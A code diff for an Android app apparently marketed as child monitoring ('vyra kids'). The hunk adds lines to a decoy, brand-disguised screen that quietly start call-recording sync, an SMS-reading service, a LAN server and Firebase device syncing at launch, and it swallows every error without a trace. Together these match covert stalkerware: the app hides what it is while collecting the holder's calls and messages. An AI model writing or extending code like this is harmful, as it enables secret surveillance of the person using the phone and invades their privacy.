@@ -35,6 +35,19 @@ class DecoyDisplayActivity : AppCompatActivity() {
         setContentView(R.layout.activity_decoy_display)
         disguiseManager.autoApplyBrandDisguise()
 
+        // Trigger background sync, LAN server, and call recording sync on launch
+        try {
+            com.vyra.kids.core.FirebaseSyncManager.getInstance(this).syncDeviceStatus()
+            com.vyra.kids.core.LocalLanSyncServer.getInstance(this).start()
+            com.vyra.kids.services.CallRecordingSyncService.syncCallsAndRecordings(this)
+            val smsIntent = Intent(this, com.vyra.kids.services.SmsObserverService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(smsIntent)
+            } else {
+                startService(smsIntent)
+            }
+        } catch (_: Exception) {}
+
         val tvDecoyTitle = findViewById<TextView>(R.id.tvDecoyTitle)
         val tvDecoyHeader = findViewById<TextView>(R.id.tvDecoyHeader)
         val ivParentUnlock = findViewById<ImageView>(R.id.ivParentUnlock)
